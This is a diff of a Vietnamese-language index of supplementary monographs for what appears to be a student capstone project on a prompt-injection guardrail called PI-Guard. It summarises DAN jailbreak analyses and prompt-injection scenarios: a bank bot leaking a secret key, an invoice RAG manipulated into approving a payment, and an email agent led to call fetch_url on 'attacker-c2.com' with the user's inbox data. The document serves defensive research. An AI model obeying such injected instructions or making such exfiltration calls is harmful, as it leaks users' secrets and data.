@@ -1,7 +1,7 @@
 # HỒ SƠ PHỤ LỤC & CHUYÊN ĐỀ BỔ TRỢ HỌC THUẬT (SUPPLEMENTARY MONOGRAPHS)
 **PI-Guard Capstone Project — Workspace: `workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/`**
 
-Thư mục này lưu trữ các hồ sơ nghiên cứu phụ lục chuyên sâu, chứng minh toán học, phân tích ma trận thưa và kịch bản tính toán chi tiết phục vụ các câu hỏi phản biện sâu của GVHD và Hội đồng chấm tốt nghiệp, tránh làm quá tải (bloated) hoặc lạc đề (out-of-scope) các báo cáo kỹ thuật chính thức.
+Thư mục này lưu trữ các hồ sơ nghiên cứu phụ lục chuyên sâu, chứng minh toán học, thẩm định y văn mỏ neo, khảo sát thực nghiệm đối chuẩn và kịch bản tính toán chi tiết phục vụ các câu hỏi phản biện sâu của GVHD và Hội đồng chấm tốt nghiệp, tránh làm quá tải (bloated) hoặc lạc đề (out-of-scope) các báo cáo kỹ thuật chính thức.
 
 ---
 
@@ -12,6 +12,9 @@ Thư mục này lưu trữ các hồ sơ nghiên cứu phụ lục chuyên sâu,
 | **SUPP-01** | **Cơ Sở Toán Học Tính Điểm Tầng 1, Lý Thuyết Rủi Ro Bayes & Phân Tách Ranh Giới Hệ Thống** | [`TIER1_SCORING_MATHEMATICAL_FORMULATION_AND_BAYES_RISK.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/TIER1_SCORING_MATHEMATICAL_FORMULATION_AND_BAYES_RISK.md) | Chứng minh toán học ma trận thưa CSR $\mathcal{O}(k)$ giải thích độ trễ CPU $< 0.05\text{ms}$; Hiệu chuẩn Platt Scaling; Lý thuyết Quyết định Bayes Nhạy cảm Chi phí xác lập 2 ngưỡng $0.15$ và $0.85$; Bảng tính điểm 4 kịch bản thực tế (Direct Injection, RAG Indirect Injection, Jailbreak DAN, Benign Fast-Pass Query); và Luận cứ bảo vệ ranh giới Tầng Ứng Dụng (parse PDF/mail theo Springer 2026) vs. External Guardrail Proxy (chống Scope Creep), bảo chứng cho Lớp Tier-0 Heuristic Scrubber (kèm 3 ví dụ bóc tách Zero-Width, Homoglyph, Base64). |
 | **SUPP-02** | **Chuyên Khảo Khoa Học: Mổ Xẻ Cơ Chế Tấn Công DAN (Do Anything Now), Cấu Trúc Ngữ Nghĩa & Chiến Lược Đánh Chặn** | [`DAN_JAILBREAK_ATTACK_MECHANISMS_AND_DEFENSE.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/DAN_JAILBREAK_ATTACK_MECHANISMS_AND_DEFENSE.md) | Mổ xẻ toàn diện cơ chế hoạt động của archetype Jailbreak DAN kinh điển: 2 nguyên lý lỗi căn chỉnh cố hữu Competing Objectives & Mismatched Generalization (Wei et al. NeurIPS 2023) kèm ví dụ đối chiếu trực diện; Giải phẫu 5 khối chức năng ngữ nghĩa của prompt DAN kèm nguyên văn prompt DAN 6.0 thực tế và phản hồi kép `[CLASSIC]` vs. `[DAN]`; Khảo sát thực nghiệm 1,405 prompt in-the-wild và 11 quần thể tiến hóa 4 thế hệ (Shen et al. ACM CCS 2024) kèm 3 ví dụ prompt đại diện (Developer Mode, AIM, Terminal); Đánh giá nguyên nhân thất bại của OpenAI Moderation & NeMo-Guardrails; và Thiết kế phòng thủ phân tầng của PI-Guard (Heuristic Scrubber + Dual-Space TF-IDF N-Grams $\le 0.4\text{ms}$ + DeBERTa-v3 MOF + Group-Aware Splitting MD5 kèm ví dụ tính toán số học khử rò rỉ dữ liệu). |
 | **SUPP-03** | **Bản Chất Toán Học $X = S \mathbin{\Vert} U$, Không Gian Token Phẳng & Chiếm Quyền Điều Khiển Luồng Ứng Dụng** | [`CONTROL_FLOW_HIJACKING_AND_FLAT_TOKEN_SPACE.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/CONTROL_FLOW_HIJACKING_AND_FLAT_TOKEN_SPACE.md) | Hình thức hóa toán học ranh giới phẳng ứng dụng $X = S \mathbin{\Vert} U$; Phân tích cơ chế Attention Hijacking và Recency Bias kèm ví dụ tính toán số học ma trận Attention chứng minh $99.37\%$ sự chú ý bị hút vào payload $U$; Ba phép đối sánh liên ngành sâu sắc (Kiến trúc Von Neumann, SQL Injection & Prepared Statements, Cờ phần cứng NX-bit / W^X) kèm ví dụ đối chiếu mã nguồn Python/LangChain nguy hiểm vs. PI-Guard Ingress Proxy an toàn; Ba kịch bản thực tế sản xuất minh họa chi tiết (Customer Bot, RAG Invoice Approval, Agentic Tool Webhook Exfiltration); và Khẳng định External Guardrail Ingress Proxy là "Prepared Statement" của kỷ nguyên LLM. |
+| **SUPP-04** | **Đánh Giá Thực Trạng Y Văn Về Mô Hình TF-IDF Trong Nghiên Cứu Guardrail** | [`LITERATURE_ASSESSMENT_TFIDF.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/LITERATURE_ASSESSMENT_TFIDF.md) | Phân tích bản chất học thuật của TF-IDF trong an toàn thông tin; mổ xẻ nghiên cứu Intel Labs (arXiv:2512.19011 [[5]](#ref5), 12/2025) về độ trễ $<1\text{ms}$ CPU và ưu thế $+26\%$ F1 khi gặp xáo trộn ký tự; ảnh minh chứng từ bài báo Neel Jain (NeurIPS 2023 [[6]](#ref6)) và đường cong suy giảm từ khóa; lý giải tại sao không có repo GitHub riêng cho TF-IDF và định vị phương pháp đối chuẩn Apple-to-Apple trên NotInject. |
+| **SUPP-05** | **Thẩm Định Toàn Diện Bài Báo Mỏ Neo Gốc PIGuard (ACL 2025) & Báo Cáo Đối Chuẩn Độc Lập** | [`CORE_ANCHOR_PIGUARD_ACL2025.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/CORE_ANCHOR_PIGUARD_ACL2025.md) | Thẩm định toàn diện bài báo mỏ neo gốc PIGuard (Hao Li et al. ACL 2025 Long Paper [[2]](#ref2)); xác thực bộ ba công khai 100% [Paper + Code + Data + Weights]; bóc tách kiến trúc DeBERTa-v3 86M, Disentangled Attention, cơ chế MOF và tập NotInject; Báo cáo đối chuẩn độc lập 6 chiều giải trình chi tiết lý do chọn PIGuard làm mỏ neo Tầng 2 mà loại bỏ Prompt-Guard (FPR 99.12%), Llama Guard 3, Ayub, Jain và InstructDetector; 4 điểm mạnh thừa kế và 4 cải tiến độc quyền của PI-Guard; cùng bảng đối chuẩn số liệu đo đạc thực tế khớp 100% bài báo. |
+| **SUPP-06** | **Báo Cáo Thực Nghiệm Đối Chuẩn & Hồ Sơ Loại Bỏ Baseline Nhúng Câu (Ayub & Majumdar, CAMLIS 2024)** | [`REJECTED_BASELINE_AYUB_CAMLIS2024.md`](file:///d:/Work/Do-an/workspaces/truongnv/reports/tasks_for_meeting_5/task_reports/supplementary/REJECTED_BASELINE_AYUB_CAMLIS2024.md) | Báo cáo thực nghiệm đối chuẩn & Hồ sơ loại bỏ baseline nhúng câu (Ayub & Majumdar, CAMLIS 2024 [[1]](#ref1)); nghiệm thu chỉ đạo của GVHD tại Meeting 4; giải trình lý do khoa học cần lưu trữ hồ sơ bằng chứng phủ định (Negative Result Dossier) để bảo vệ trước Hội đồng và phục vụ Ablation Study Chapter 4; phân tích tử huyệt Overdefense FPR $58.41\%$ trên NotInject và độ trễ trích xuất vector $11.02\text{ms}$ CPU của MiniLM; so sánh đối chuẩn chi tiết với TF-IDF. |
 
 ---
 
@@ -37,6 +40,28 @@ Nhằm đảm bảo **$100\%$ lý thuyết, công thức toán học, cơ chế 
 | **SUPP-03** | **Direct Injection & Prompt Leaking** | Kịch bản thực tế sản xuất | Mục 4.1 | Bot CSKH ngân hàng: Chỉ đạo mật `SEC_KEY_8899` $\rightarrow$ Payload ghi đè $\rightarrow$ LLM rò rỉ nguyên văn khóa bảo mật. |
 | **SUPP-03** | **Indirect Injection RAG duyệt hóa đơn** | Kịch bản thực tế sản xuất | Mục 4.2 | ERP kiểm soát hóa đơn: Hóa đơn 85 triệu lồng chỉ thị ẩn $\rightarrow$ LLM xuất `status: APPROVED` $\rightarrow$ Tự động giải ngân sai trái. |
 | **SUPP-03** | **Agentic Tool Hijacking & Exfiltration** | Kịch bản thực tế sản xuất | Mục 4.3 | Trợ lý email cá nhân: Email rác chứa lệnh bí mật $\rightarrow$ Agent tự động gọi `fetch_url(url="attacker-c2.com?data=...")` đánh cắp inbox. |
+| **SUPP-04** | **Bằng chứng y văn Jain NeurIPS 2023 & Suy giảm từ khóa** | Ảnh bài báo gốc & Biểu đồ đo đạc | Mục 3 & Mục 4 | Ảnh tiêu đề và Table 1 bài báo Jain et al. NeurIPS 2023; Biểu đồ suy giảm độ chính xác khi số từ kích hoạt tăng (NotInject 1 -> 2 -> 3 words). |
+| **SUPP-05** | **Bằng chứng bài báo PIGuard ACL 2025 & Ma trận đối chuẩn 6 mô hình** | Ảnh PDF bài báo, Biểu đồ so sánh & Scorecard | Mục 1, 4, 6, 7, 10 | Ảnh tiêu đề ACL 2025; Table 1 & Table 2 MOF; Table 7 Benchmarks; Bảng đối chuẩn 6 chiều; Biểu đồ Overdefense Prompt-Guard; Scorecard đo đạc cục bộ trùng khớp 100% bài báo. |
+| **SUPP-06** | **Bằng chứng bài báo Ayub CAMLIS 2024 & Thực nghiệm Overdefense** | Ảnh bài báo gốc & Biểu đồ đo đạc độc lập | Mục 1, 5, 6 | Ảnh tiêu đề CAMLIS 2024; Table 3 & 4 kết quả công bố; Biểu đồ thực nghiệm đo đạc độc lập chỉ rõ FPR 58.41% trên NotInject và biểu đồ cột Paper vs Local. |
+
+![Bảng điểm tổng hợp đối soát y văn gốc và thực nghiệm độc lập](../../task_3_replication/Tier2_PIGuard_ACL2025/figures/02_empirical_plots/local_vs_paper_scorecard.png)
+*Hình: Bảng điểm tổng hợp đối soát y văn gốc (ACL 2025 [[2]](#ref2)) và thực nghiệm đo đạc độc lập tại phòng lab Task 3.*
+
+---
+
+## 📚 TÀI LIỆU THAM KHẢO HỌC THUẬT (REFERENCES)
+
+<a id="ref1"></a>
+- **[[1]]** M. A. Ayub and S. Majumdar, "Embedding-based classifiers can detect prompt injection attacks," in *Proceedings of the Conference on Applied Machine Learning in Information Security (CAMLIS 2024)*, Arlington, VA, USA, Oct. 2024. [arXiv:2410.22284](https://arxiv.org/pdf/2410.22284).
+
+<a id="ref2"></a>
+- **[[2]]** H. Li, X. Liu, N. Zhang, and C. Xiao, "PIGuard: Prompt Injection Guardrail via Mitigating Overdefense for Free," in *Proceedings of the 63rd Annual Meeting of the Association for Computational Linguistics (ACL 2025)*, Vienna, Austria, 2025. [arXiv:2410.22770](https://arxiv.org/pdf/2410.22770) | [ACL Anthology](https://aclanthology.org/2025.acl-long.1468.pdf).
+
+<a id="ref5"></a>
+- **[[5]]** V. Majhi, S. T. S. N. V. P. R. N., A. R. R., and S. S., "Do You Really Need a GPU to Guard Your LLM? CPU-Class Classifiers and Multi-Stage Pipelines for Safety Enforcement at Scale," *arXiv preprint arXiv:2512.19011*, Dec. 2025. [arXiv:2512.19011](https://arxiv.org/pdf/2512.19011).
+
+<a id="ref6"></a>
+- **[[6]]** N. Jain et al., "Baseline Defenses for Adversarial Attacks on Language Models," in *Proc. NeurIPS Workshop on Robustness of Few-shot and Zero-shot Learning*, 2023. [arXiv:2309.00614](https://arxiv.org/pdf/2309.00614).
 
 ---
 
